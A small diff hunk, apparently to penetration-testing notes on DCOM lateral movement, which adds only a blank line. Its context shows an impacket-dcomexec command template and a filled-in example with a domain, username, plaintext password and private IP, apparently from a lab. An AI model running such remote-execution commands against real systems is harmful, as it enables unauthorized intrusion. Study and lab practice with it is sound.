@@ -26,6 +26,7 @@ Remember: port 135 being open does not prove that DCOM execution will succeed. R
 ```
 impacket-dcomexec DOMAIN/USER:PASSWORD@<TARGET_IP>
 ```
+
 Example:
 ```
 impacket-dcomexec laser.com/Eric.Wallows:'EricLikesRunning800'@192.168.245.174
